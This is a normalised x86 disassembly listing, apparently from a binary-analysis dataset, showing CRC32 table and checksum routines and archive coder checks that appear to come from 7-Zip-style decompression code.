mov ecx [ eax + 0x4 ]
call ecx
add esp 0x8
mov edx [ ebp + 0x8 ]
mov [ edx ] 0x0
mov eax [ ebp + 0x8 ]
mov [ eax + 0x4 ] 0x0
pop ebp
retn
sub_4023b0
push ebp
mov ebp esp
sub esp 0x8
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] ecx
push rw-data
mov eax [ ebp - 0x4 ]
push eax
mov edx [ ebp - 0x8 ]
or ecx 0xffffffff
call [ rw-data ]
xor eax 0xffffffff
mov esp ebp
pop ebp
retn
sub_4023e0
push ebp
mov ebp esp
sub esp 0x10
mov [ ebp - 0x4 ] 0x0
jmp r-xdata
cmp [ ebp - 0x4 ] 0x100
jae r-xdata
jmp r-xdata
mov ecx [ ebp - 0x4 ]
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0xc ] 0x0
jmp r-xdata
cmp [ ebp - 0x4 ] 0x800
jae r-xdata
cmp [ ebp - 0xc ] 0x8
jae r-xdata
mov [ rw-data ] sub_4024b0
call sub_4086e0
test eax eax
jne r-xdata
mov edx [ ebp - 0x4 ]
mov eax [ edx * 4 + rw-data ]
mov [ ebp - 0x10 ] eax
mov ecx [ ebp - 0x10 ]
and ecx 0xff
mov edx [ ebp - 0x10 ]
shr edx 0x8
xor edx [ ecx * 4 + rw-data ]
mov eax [ ebp - 0x4 ]
mov [ eax * 4 + rw-data ] edx
jmp r-xdata
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
mov [ edx * 4 + rw-data ] eax
jmp r-xdata
mov eax [ ebp - 0x8 ]
shr eax 0x1
mov ecx [ ebp - 0x8 ]
and ecx 0x1
sub ecx 0x1
not ecx
and ecx 0xedb88320
xor eax ecx
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov esp ebp
pop ebp
retn
mov [ rw-data ] sub_4025c0
mov ecx [ ebp - 0x4 ]
add ecx 0x1
mov [ ebp - 0x4 ] ecx
mov eax [ ebp - 0x4 ]
add eax 0x1
mov [ ebp - 0x4 ] eax
mov edx [ ebp - 0xc ]
add edx 0x1
mov [ ebp - 0xc ] edx
sub_4024b0
push ebp
mov ebp esp
sub esp 0xc
push esi
mov [ ebp - 0xc ] edx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp - 0xc ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
cmp [ ebp + 0x8 ] 0x0
jbe r-xdata
jmp r-xdata
mov eax [ ebp - 0x8 ]
and eax 0x3
je r-xdata
cmp [ ebp + 0x8 ] 0x4
jb r-xdata
mov ecx [ ebp - 0x8 ]
movzx edx [ ecx ]
xor edx [ ebp - 0x4 ]
and edx 0xff
mov eax [ ebp - 0x4 ]
shr eax 0x8
mov ecx [ ebp + 0xc ]
xor eax [ ecx + edx * 4 ]
mov [ ebp - 0x4 ] eax
jmp r-xdata
jmp r-xdata
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
xor edx [ ecx ]
mov [ ebp - 0x4 ] edx
mov eax [ ebp - 0x4 ]
and eax 0xff
mov ecx [ ebp - 0x4 ]
shr ecx 0x8
and ecx 0xff
mov edx [ ebp + 0xc ]
mov esi [ ebp + 0xc ]
mov eax [ edx + eax * 4 + 0xc00 ]
xor eax [ esi + ecx * 4 + 0x800 ]
mov ecx [ ebp - 0x4 ]
shr ecx 0x10
and ecx 0xff
mov edx [ ebp + 0xc ]
xor eax [ edx + ecx * 4 + 0x400 ]
mov ecx [ ebp - 0x4 ]
shr ecx 0x18
mov edx [ ebp + 0xc ]
xor eax [ edx + ecx * 4 ]
mov [ ebp - 0x4 ] eax
jmp r-xdata
mov ecx [ ebp + 0x8 ]
sub ecx 0x1
mov [ ebp + 0x8 ] ecx
mov edx [ ebp - 0x8 ]
add edx 0x1
mov [ ebp - 0x8 ] edx
cmp [ ebp + 0x8 ] 0x0
jbe r-xdata
mov edx [ ebp + 0x8 ]
sub edx 0x4
mov [ ebp + 0x8 ] edx
mov eax [ ebp - 0x8 ]
add eax 0x4
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
pop esi
mov esp ebp
pop ebp
retn 0x8
mov edx [ ebp - 0x8 ]
movzx eax [ edx ]
xor eax [ ebp - 0x4 ]
and eax 0xff
mov ecx [ ebp - 0x4 ]
shr ecx 0x8
mov edx [ ebp + 0xc ]
xor ecx [ edx + eax * 4 ]
mov [ ebp - 0x4 ] ecx
jmp r-xdata
mov eax [ ebp + 0x8 ]
sub eax 0x1
mov [ ebp + 0x8 ] eax
mov ecx [ ebp - 0x8 ]
add ecx 0x1
mov [ ebp - 0x8 ] ecx
sub_4025c0
push ebp
mov ebp esp
sub esp 0x8
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] ecx
mov eax [ ebp + 0xc ]
push eax
mov ecx [ ebp + 0x8 ]
push ecx
mov edx [ ebp - 0x4 ]
mov ecx [ ebp - 0x8 ]
call sub_4024b0
mov esp ebp
pop ebp
retn 0x8
sub_4025f0
push ebp
mov ebp esp
sub esp 0x98
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x88 ] 0x0
mov [ ebp - 0x70 ] 0x0
mov [ ebp - 0x74 ] 0x0
mov eax [ ebp + 0x20 ]
push eax
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x14 ]
push edx
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x10 ]
push ecx
lea edx [ ebp - 0x84 ]
push edx
call sub_40ba80
add esp 0x10
mov [ ebp - 0x8c ] eax
cmp [ ebp - 0x8c ] 0x0
je r-xdata
mov eax [ ebp + 0x18 ]
mov [ ebp - 0x70 ] eax
mov ecx [ ebp + 0x1c ]
mov [ ebp - 0x5c ] ecx
lea edx [ ebp - 0x84 ]
push edx
call sub_40b430
add esp 0x4
mov eax [ ebp - 0x8c ]
jmp r-xdata
lea edx [ ebp - 0x8 ]
push edx
lea eax [ ebp - 0x14 ]
push eax
mov ecx [ ebp + 0x14 ]
push ecx
mov edx [ ebp + 0x14 ]
mov eax [ edx ]
call eax
add esp 0xc
mov [ ebp - 0x88 ] eax
cmp [ ebp - 0x88 ] 0x0
je r-xdata
ja r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_421ed7
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0x8 ]
mov [ ebp - 0xc ] ecx
mov edx [ ebp - 0x60 ]
mov [ ebp - 0x90 ] edx
lea eax [ ebp - 0x10 ]
push eax
push 0x1
lea ecx [ ebp - 0xc ]
push ecx
mov edx [ ebp - 0x14 ]
push edx
mov eax [ ebp + 0x1c ]
push eax
lea ecx [ ebp - 0x84 ]
push ecx
call sub_40b510
add esp 0x18
mov [ ebp - 0x88 ] eax
mov edx [ ebp - 0x8 ]
sub edx [ ebp - 0xc ]
mov [ ebp - 0x8 ] edx
xor eax eax
mov ecx [ ebp + 0xc ]
sub ecx [ ebp - 0xc ]
mov edx [ ebp + 0x10 ]
sbb edx eax
mov [ ebp + 0xc ] ecx
mov [ ebp + 0x10 ] edx
cmp [ ebp - 0x88 ] 0x0
je r-xdata
jmp r-xdata
mov ecx [ ebp + 0xc ]
mov [ ebp - 0x8 ] ecx
mov eax [ ebp - 0x98 ]
cmp eax [ ebp + 0xc ]
jbe r-xdata
mov eax [ ebp - 0x60 ]
cmp eax [ ebp - 0x5c ]
je r-xdata
jmp r-xdata
mov ecx [ ebp + 0x20 ]
push ecx
lea edx [ ebp - 0x84 ]
push edx
call sub_40b8e0
add esp 0x8
mov eax [ ebp - 0x88 ]
mov edx [ ebp - 0x5c ]
cmp edx [ ebp + 0x1c ]
jne r-xdata
cmp [ ebp - 0xc ] 0x0
jne r-xdata
mov [ ebp - 0x88 ] 0x1
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0xc ]
push eax
mov ecx [ ebp + 0x14 ]
push ecx
mov edx [ ebp + 0x14 ]
mov eax [ edx + 0x4 ]
call eax
add esp 0x8
mov [ ebp - 0x88 ] eax
cmp [ ebp - 0x88 ] 0x0
je r-xdata
mov ecx [ ebp - 0x90 ]
cmp ecx [ ebp - 0x60 ]
jne r-xdata
cmp [ ebp - 0x10 ] 0x1
je r-xdata
jmp r-xdata
jmp r-xdata
jmp r-xdata
cmp [ ebp - 0x10 ] 0x4
je r-xdata
mov [ ebp - 0x14 ] 0x0
mov [ ebp - 0x8 ] 0x40000
mov eax [ ebp - 0x8 ]
xor ecx ecx
mov [ ebp - 0x98 ] eax
mov [ ebp - 0x94 ] ecx
mov edx [ ebp - 0x94 ]
cmp edx [ ebp + 0x10 ]
jb r-xdata
sub_4027d0
push ebp
mov ebp esp
sub esp 0xb4
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov [ ebp - 0xa4 ] 0x0
mov [ ebp - 0x8c ] 0x0
mov [ ebp - 0x90 ] 0x0
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x14 ] 0x1
je r-xdata
mov ecx [ ebp + 0x20 ]
push ecx
mov edx 0x1
imul edx edx 0x0
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x10 ]
movzx edx [ ecx + edx ]
push edx
lea eax [ ebp - 0xa0 ]
push eax
call sub_4088b0
add esp 0xc
mov [ ebp - 0xa8 ] eax
cmp [ ebp - 0xa8 ] 0x0
je r-xdata
mov eax 0x1
jmp r-xdata
mov ecx [ ebp + 0x18 ]
mov [ ebp - 0x8c ] ecx
mov edx [ ebp + 0x1c ]
mov [ ebp - 0x78 ] edx
lea eax [ ebp - 0xa0 ]
push eax
call sub_408910
add esp 0x4
mov eax [ ebp - 0xa8 ]
jmp r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_421ed7
mov esp ebp
pop ebp
retn
lea eax [ ebp - 0x8 ]
push eax
lea ecx [ ebp - 0x14 ]
push ecx
mov edx [ ebp + 0x14 ]
push edx
mov eax [ ebp + 0x14 ]
mov ecx [ eax ]
call ecx
add esp 0xc
mov [ ebp - 0xa4 ] eax
cmp [ ebp - 0xa4 ] 0x0
je r-xdata
ja r-xdata
mov edx [ ebp - 0x8 ]
mov [ ebp - 0xc ] edx
mov eax [ ebp - 0x7c ]
mov [ ebp - 0xb4 ] eax
lea ecx [ ebp - 0x10 ]
push ecx
push 0x1
lea edx [ ebp - 0xc ]
push edx
mov eax [ ebp - 0x14 ]
push eax
mov ecx [ ebp + 0x1c ]
push ecx
lea edx [ ebp - 0xa0 ]
push edx
call sub_408bf0
add esp 0x18
mov [ ebp - 0xa4 ] eax
mov eax [ ebp - 0x8 ]
sub eax [ ebp - 0xc ]
mov [ ebp - 0x8 ] eax
xor ecx ecx
mov edx [ ebp + 0xc ]
sub edx [ ebp - 0xc ]
mov eax [ ebp + 0x10 ]
sbb eax ecx
mov [ ebp + 0xc ] edx
mov [ ebp + 0x10 ] eax
cmp [ ebp - 0xa4 ] 0x0
je r-xdata
jmp r-xdata
mov edx [ ebp + 0xc ]
mov [ ebp - 0x8 ] edx
mov ecx [ ebp - 0xb0 ]
cmp ecx [ ebp + 0xc ]
jbe r-xdata
mov ecx [ ebp - 0x7c ]
cmp ecx [ ebp - 0x78 ]
je r-xdata
jmp r-xdata
mov edx [ ebp + 0x20 ]
push edx
lea eax [ ebp - 0xa0 ]
push eax
call sub_40b8e0
add esp 0x8
mov eax [ ebp - 0xa4 ]
mov eax [ ebp - 0x78 ]
cmp eax [ ebp + 0x1c ]
jne r-xdata
cmp [ ebp - 0xc ] 0x0
jne r-xdata
mov [ ebp - 0xa4 ] 0x1
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
mov ecx [ ebp - 0xc ]
push ecx
mov edx [ ebp + 0x14 ]
push edx
mov eax [ ebp + 0x14 ]
mov ecx [ eax + 0x4 ]
call ecx
add esp 0x8
mov [ ebp - 0xa4 ] eax
cmp [ ebp - 0xa4 ] 0x0
je r-xdata
mov edx [ ebp - 0xb4 ]
cmp edx [ ebp - 0x7c ]
jne r-xdata
cmp [ ebp - 0x10 ] 0x1
je r-xdata
jmp r-xdata
jmp r-xdata
jmp r-xdata
mov [ ebp - 0x14 ] 0x0
mov [ ebp - 0x8 ] 0x40000
mov ecx [ ebp - 0x8 ]
xor edx edx
mov [ ebp - 0xb0 ] ecx
mov [ ebp - 0xac ] edx
mov eax [ ebp - 0xac ]
cmp eax [ ebp + 0x10 ]
jb r-xdata
sub_4029c0
push ebp
mov ebp esp
sub esp 0x1c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x8 ] 0x40000
mov eax [ ebp - 0x8 ]
xor ecx ecx
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x18 ] ecx
mov edx [ ebp - 0x18 ]
cmp edx [ ebp + 0xc ]
jb r-xdata
cmp [ ebp + 0x8 ] 0x0
jbe r-xdata
lea edx [ ebp - 0x8 ]
push edx
lea eax [ ebp - 0xc ]
push eax
mov ecx [ ebp + 0x10 ]
push ecx
mov edx [ ebp + 0x10 ]
mov eax [ edx ]
call eax
add esp 0xc
mov [ ebp - 0x14 ] eax
cmp [ ebp - 0x14 ] 0x0
je r-xdata
ja r-xdata
xor eax eax
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x14 ]
jmp r-xdata
mov ecx [ ebp + 0x8 ]
mov [ ebp - 0x8 ] ecx
mov eax [ ebp - 0x1c ]
cmp eax [ ebp + 0x8 ]
jbe r-xdata
mov ecx [ ebp - 0x8 ]
push ecx
mov edx [ ebp - 0xc ]
push edx
mov eax [ ebp + 0x14 ]
push eax
call sub_424fc0
add esp 0xc
mov ecx [ ebp + 0x14 ]
add ecx [ ebp - 0x8 ]
mov [ ebp + 0x14 ] ecx
xor edx edx
mov eax [ ebp + 0x8 ]
sub eax [ ebp - 0x8 ]
mov ecx [ ebp + 0xc ]
sbb ecx edx
mov [ ebp + 0x8 ] eax
mov [ ebp + 0xc ] ecx
mov edx [ ebp - 0x8 ]
push edx
mov eax [ ebp + 0x10 ]
push eax
mov ecx [ ebp + 0x10 ]
mov edx [ ecx + 0x4 ]
call edx
add esp 0x8
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x10 ] 0x0
je r-xdata
mov eax 0x6
jmp r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_421ed7
mov esp ebp
pop ebp
retn
jmp r-xdata
mov eax [ ebp - 0x10 ]
jmp r-xdata
cmp [ ebp + 0xc ] 0x0
ja r-xdata
sub_402ab0
push ebp
mov ebp esp
push ecx
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax 0x1
jmp r-xdata
cmp [ ebp - 0x4 ] 0x21
je r-xdata
mov esp ebp
pop ebp
retn
cmp [ ebp - 0x4 ] 0x30101
je r-xdata
jmp r-xdata
xor eax eax
sub_402ae0
push ebp
mov ebp esp
sub esp 0x8
mov eax [ ebp + 0x8 ]
cmp [ eax ] 0x1
jne r-xdata
mov [ ebp - 0x8 ] 0x0
mov ecx [ ebp + 0x8 ]
cmp [ ecx + 0x4 ] 0x1
jne r-xdata
mov edx [ ebp + 0x8 ]
mov [ ebp - 0x4 ] edx
mov eax [ ebp - 0x4 ]
cmp [ eax + 0xc ] 0x0
ja r-xdata
jb r-xdata
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x8 ]
push eax
call sub_402ab0
add esp 0x4
test eax eax
je r-xdata
mov ecx [ ebp - 0x4 ]
cmp [ ecx + 0x8 ] 0xffffffff
ja r-xdata
mov [ ebp - 0x8 ] 0x1
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov esp ebp
pop ebp
retn
sub_402b40
push ebp
mov ebp esp
sub esp 0x14
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x10 ] 0x1
jb r-xdata
mov eax 0x4
jmp r-xdata
mov ecx [ ebp + 0x8 ]
cmp [ ecx + 0x10 ] 0x4
jbe r-xdata
mov esp ebp
pop ebp
retn
mov edx 0x18
imul edx edx 0x0
mov eax [ ebp + 0x8 ]
add edx [ eax ]
push edx
call sub_402ae0
add esp 0x4
test eax eax
jne r-xdata
mov ecx [ ebp + 0x8 ]
cmp [ ecx + 0x10 ] 0x1
jne r-xdata
mov eax 0x4
jmp r-xdata
mov ecx [ ebp + 0x8 ]
cmp [ ecx + 0x10 ] 0x2
jne r-xdata
mov edx [ ebp + 0x8 ]
cmp [ edx + 0x18 ] 0x1
jne r-xdata
mov ecx [ ebp + 0x8 ]
cmp [ ecx + 0x10 ] 0x4
jne r-xdata
mov edx 0x18
shl edx 0x0
mov eax [ ebp + 0x8 ]
add edx [ eax ]
mov [ ebp - 0x4 ] edx
mov ecx [ ebp - 0x4 ]
mov [ ebp - 0x8 ] ecx
mov edx [ ebp - 0x8 ]
cmp [ edx + 0xc ] 0x0
ja r-xdata
mov eax 0x4
jmp r-xdata
mov eax 0x4
imul eax eax 0x0
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x8 ]
cmp [ eax + edx ] 0x0
jne r-xdata
mov eax 0x4
mov edx 0x18
shl edx 0x0
mov eax [ ebp + 0x8 ]
add edx [ eax ]
push edx
call sub_402ae0
add esp 0x4
test eax eax
je r-xdata
mov eax 0x4
jmp r-xdata
jb r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x14 ] 0x0
je r-xdata
mov eax 0x4
jmp r-xdata
mov ecx 0x18
shl ecx 0x1
mov edx [ ebp + 0x8 ]
add ecx [ edx ]
push ecx
call sub_402ae0
add esp 0x4
test eax eax
je r-xdata
mov ecx [ ebp - 0x4 ]
cmp [ ecx ] 0x1
jne r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x8 ] 0xffffffff
ja r-xdata
xor eax eax
jmp r-xdata
mov eax 0x18
imul eax eax 0x3
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
mov [ ebp - 0x14 ] edx
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x10 ]
mov ecx [ ebp - 0x14 ]
cmp [ ecx + eax + 0x8 ] 0x303011b
jne r-xdata
mov edx [ ebp - 0x4 ]
cmp [ edx + 0x4 ] 0x1
jne r-xdata
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0x14 ]
cmp [ eax + edx + 0xc ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x18 ] 0x1
jne r-xdata
mov ecx 0x18
imul ecx ecx 0x3
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
cmp [ eax + ecx ] 0x4
jne r-xdata
mov ecx 0x4
imul ecx ecx 0x0
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x8 ]
cmp [ ecx + eax ] 0x0
jne r-xdata
mov ecx 0x18
imul ecx ecx 0x3
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
cmp [ eax + ecx + 0x4 ] 0x1
je r-xdata
mov ecx [ ebp + 0x8 ]
cmp [ ecx + 0x14 ] 0x1
jne r-xdata
mov ecx [ ebp + 0x8 ]
cmp [ ecx + 0x18 ] 0x4
jne r-xdata
mov edx 0x8
imul edx edx 0x0
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x4 ]
cmp [ ecx + edx ] 0x1
jne r-xdata
mov eax 0x4
jmp r-xdata
mov edx 0x4
imul edx edx 0x0
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x8 ]
cmp [ edx + ecx ] 0x2
jne r-xdata
mov edx 0x8
imul edx edx 0x0
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x4 ]
cmp [ ecx + edx + 0x4 ] 0x0
je r-xdata
mov edx 0x4
shl edx 0x0
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x8 ]
cmp [ edx + ecx ] 0x6
jne r-xdata
mov edx [ ebp - 0x4 ]
mov eax [ edx + 0x8 ]
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0x3030103
je r-xdata
mov edx 0x4
shl edx 0x1
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x8 ]
cmp [ edx + ecx ] 0x1
jne r-xdata
jmp r-xdata
cmp [ ebp - 0xc ] 0x3030501
je r-xdata
mov edx 0x4
imul edx edx 0x3
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x8 ]
cmp [ edx + ecx ] 0x0
jne r-xdata
xor eax eax
jmp r-xdata
jmp r-xdata
mov edx [ ebp + 0x8 ]
cmp [ edx + 0x14 ] 0x3
jne r-xdata
mov eax 0x4
jmp r-xdata
mov eax 0x8
imul eax eax 0x0
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x4 ]
cmp [ edx + eax ] 0x5
jne r-xdata
mov eax 0x8
imul eax eax 0x0
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x4 ]
cmp [ edx + eax + 0x4 ] 0x0
jne r-xdata
mov eax 0x8
shl eax 0x0
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x4 ]
cmp [ edx + eax ] 0x4
jne r-xdata
mov eax 0x8
shl eax 0x0
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x4 ]
cmp [ edx + eax + 0x4 ] 0x1
jne r-xdata
mov eax 0x8
shl eax 0x1
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x4 ]
cmp [ edx + eax ] 0x3
jne r-xdata
mov eax 0x8
shl eax 0x1
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x4 ]
cmp [ edx + eax + 0x4 ] 0x2
je r-xdata
xor eax eax
jmp r-xdata
sub_402e40
push ebp
mov ebp esp
sub esp 0xc
push esi
xorpd xmm0 xmm0
movlpd [ ebp - 0xc ] xmm0
mov [ ebp - 0x4 ] 0x0
jmp r-xdata
mov ecx [ ebp - 0x4 ]
cmp ecx [ ebp + 0xc ]
jae r-xdata
mov eax [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
pop esi
mov esp ebp
pop ebp
retn
mov edx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0xc ]
add ecx [ eax + edx * 8 ]
mov esi [ ebp - 0x8 ]
adc esi [ eax + edx * 8 + 0x4 ]
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] esi
jmp r-xdata
mov eax [ ebp - 0x4 ]
add eax 0x1
mov [ ebp - 0x4 ] eax
sub_402e90
push ebp
mov ebp esp
sub esp 0xc4
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x40 ] 0x0
mov [ ebp - 0x3c ] 0x0
mov [ ebp - 0x38 ] 0x0
mov [ ebp - 0x80 ] 0x0
mov [ ebp - 0x88 ] 0x0
mov eax [ ebp + 0x8 ]
push eax
call sub_402b40
add esp 0x4
mov [ ebp - 0x78 ] eax
cmp [ ebp - 0x78 ] 0x0
je r-xdata
mov [ ebp - 0xc ] 0x0
jmp r-xdata
mov eax [ ebp - 0x78 ]
jmp r-xdata
mov edx [ ebp + 0x8 ]
mov eax [ ebp - 0xc ]
cmp eax [ edx + 0x10 ]
jae r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_421ed7
mov esp ebp
pop ebp
retn
xor eax eax
mov ecx [ ebp - 0xc ]
imul ecx ecx 0x18
mov edx [ ebp + 0x8 ]
add ecx [ edx ]
mov [ ebp - 0x14 ] ecx
mov eax [ ebp - 0x14 ]
mov ecx [ eax + 0x8 ]
push ecx
call sub_402ab0
add esp 0x4
test eax eax
je r-xdata
mov ecx [ ebp - 0x14 ]
mov [ ebp - 0x5c ] ecx
mov edx [ ebp - 0x5c ]
cmp [ edx + 0x8 ] 0x303011b
jne r-xdata
mov [ ebp - 0x2c ] 0x0
mov edx [ ebp + 0x1c ]
mov [ ebp - 0x18 ] edx
mov eax [ ebp + 0x20 ]
mov [ ebp - 0x10 ] eax
mov ecx [ ebp + 0x8 ]
cmp [ ecx + 0x10 ] 0x4
jne r-xdata
cmp [ ebp - 0xc ] 0x1
je r-xdata
mov eax [ ebp - 0x5c ]
cmp [ eax + 0xc ] 0x0
jne r-xdata
mov edx [ ebp - 0x2c ]
push edx
mov eax [ ebp + 0xc ]
push eax
call sub_402e40
add esp 0x8
mov [ ebp - 0xb8 ] eax
mov [ ebp - 0xb4 ] edx
mov ecx [ ebp - 0x2c ]
mov edx [ ebp + 0xc ]
mov eax [ edx + ecx * 8 ]
mov [ ebp - 0x20 ] eax
mov ecx [ edx + ecx * 8 + 0x4 ]
mov [ ebp - 0x1c ] ecx
mov edx [ ebp + 0x14 ]
add edx [ ebp - 0xb8 ]
mov eax [ ebp + 0x18 ]
adc eax [ ebp - 0xb4 ]
push eax
push edx
mov ecx [ ebp + 0x10 ]
push ecx
call sub_407840
add esp 0xc
mov [ ebp - 0x84 ] eax
cmp [ ebp - 0x84 ] 0x0
je r-xdata
mov [ ebp - 0xc4 ] 0x3
mov [ ebp - 0xc0 ] 0x2
mov [ ebp - 0xbc ] 0x0
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0xc ]
mov ecx [ ebp - 0xc ]
mov edx [ eax + ecx * 8 ]
mov [ ebp - 0x28 ] edx
mov eax [ eax + ecx * 8 + 0x4 ]
mov [ ebp - 0x24 ] eax
mov ecx [ ebp - 0xc ]
mov edx [ ebp + ecx * 4 - 0xc4 ]
mov [ ebp - 0x2c ] edx
cmp [ ebp - 0xc ] 0x2
jae r-xdata
mov eax [ ebp - 0x14 ]
mov ecx [ eax + 0x8 ]
mov [ ebp - 0x64 ] ecx
mov edx [ eax + 0xc ]
mov [ ebp - 0x60 ] edx
cmp [ ebp - 0x64 ] 0x3030103
jne r-xdata
mov eax 0x4
jmp r-xdata
push 0x1
mov ecx [ ebp + 0xc ]
push ecx
call sub_402e40
add esp 0x8
mov [ ebp - 0x98 ] eax
mov [ ebp - 0x94 ] edx
mov edx 0x8
shl edx 0x0
mov eax [ ebp + 0xc ]
mov ecx [ eax + edx ]
mov [ ebp - 0x48 ] ecx
mov edx [ eax + edx + 0x4 ]
mov [ ebp - 0x44 ] edx
cmp [ ebp - 0xc ] 0x3
je r-xdata
mov edx [ ebp - 0x14 ]
mov [ ebp - 0x6c ] edx
mov eax [ ebp - 0x6c ]
mov ecx [ ebp - 0x6c ]
mov edx [ eax + 0x8 ]
or edx [ ecx + 0xc ]
jne r-xdata
mov eax [ ebp - 0x84 ]
jmp r-xdata
cmp [ ebp - 0xc ] 0x2
jne r-xdata
mov eax [ ebp - 0x28 ]
mov [ ebp - 0x10 ] eax
mov ecx [ ebp - 0x10 ]
xor edx edx
mov [ ebp - 0x90 ] ecx
mov [ ebp - 0x8c ] edx
mov eax [ ebp - 0x90 ]
cmp eax [ ebp - 0x28 ]
jne r-xdata
cmp [ ebp - 0x64 ] 0x3030501
jne r-xdata
cmp [ ebp - 0x60 ] 0x0
je r-xdata
mov eax [ ebp + 0x14 ]
add eax [ ebp - 0x98 ]
mov ecx [ ebp + 0x18 ]
adc ecx [ ebp - 0x94 ]
push ecx
push eax
mov edx [ ebp + 0x10 ]
push edx
call sub_407840
add esp 0xc
mov [ ebp - 0x4c ] eax
cmp [ ebp - 0x4c ] 0x0
je r-xdata
mov eax 0x4
jmp r-xdata
mov edx [ ebp - 0x14 ]
mov [ ebp - 0x58 ] edx
mov eax [ ebp - 0x58 ]
cmp [ eax + 0x8 ] 0x30101
jne r-xdata
mov eax [ ebp - 0x10 ]
xor ecx ecx
mov [ ebp - 0xa8 ] eax
mov [ ebp - 0xa4 ] ecx
mov edx [ ebp - 0x20 ]
cmp edx [ ebp - 0xa8 ]
jne r-xdata
mov eax 0x4
jmp r-xdata
mov eax [ ebp + 0x20 ]
xor ecx ecx
mov [ ebp - 0xb0 ] eax
mov [ ebp - 0xac ] ecx
mov edx [ ebp - 0x24 ]
cmp edx [ ebp - 0xac ]
jb r-xdata
mov eax 0x2
jmp r-xdata
mov ecx [ ebp - 0x8c ]
cmp ecx [ ebp - 0x24 ]
je r-xdata
jmp r-xdata
cmp [ ebp - 0x60 ] 0x0
je r-xdata
mov [ ebp - 0x8 ] 0x0
push 0x0
lea eax [ ebp - 0x8 ]
push eax
push 0x0
mov ecx [ ebp + 0x20 ]
push ecx
mov edx [ ebp + 0x1c ]
push edx
call sub_408250
add esp 0x14
jmp r-xdata
mov eax [ ebp - 0x48 ]
mov ecx 0x4
shl ecx 0x1
mov [ ebp + ecx - 0x40 ] eax
mov edx 0x4
shl edx 0x1
mov eax [ ebp + edx - 0x40 ]
xor ecx ecx
mov [ ebp - 0xa0 ] eax
mov [ ebp - 0x9c ] ecx
mov edx [ ebp - 0xa0 ]
cmp edx [ ebp - 0x48 ]
jne r-xdata
mov eax [ ebp - 0x4c ]
jmp r-xdata
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x54 ] eax
mov ecx [ ebp - 0x54 ]
cmp [ ecx + 0x8 ] 0x21
jne r-xdata
mov ecx [ ebp - 0x58 ]
cmp [ ecx + 0xc ] 0x0
jne r-xdata
mov eax 0x1
jmp r-xdata
mov eax [ ebp - 0x1c ]
cmp eax [ ebp - 0xa4 ]
je r-xdata
mov ecx [ ebp + 0x20 ]
sub ecx [ ebp - 0x28 ]
add ecx [ ebp + 0x1c ]
mov [ ebp - 0x18 ] ecx
mov edx [ ebp - 0x18 ]
mov [ ebp - 0x88 ] edx
mov eax [ ebp - 0x28 ]
mov [ ebp - 0x10 ] eax
mov ecx [ ebp - 0x10 ]
mov [ ebp - 0x80 ] ecx
jmp r-xdata
ja r-xdata
mov edx [ ebp - 0x10 ]
push edx
mov eax [ ebp + 0x24 ]
push eax
mov ecx [ ebp + 0x24 ]
mov edx [ ecx ]
call edx
add esp 0x8
mov [ ebp - 0x34 ] eax
